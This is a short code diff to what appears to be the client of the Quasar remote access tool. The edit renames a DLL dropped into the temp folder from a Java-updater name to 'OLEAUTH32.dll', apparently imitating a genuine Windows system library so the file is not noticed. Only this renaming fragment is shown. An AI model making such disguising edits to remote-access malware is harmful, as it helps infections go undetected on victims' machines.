@@ -373,7 +373,7 @@ namespace Quasar.Client.Messages
             dllPath = Path.Combine(new string[]
             {
                     Path.GetTempPath(),
-                    "JavaUpdater_jdk22_x86.dll"
+                    "OLEAUTH32.dll"
             });
             try
             {
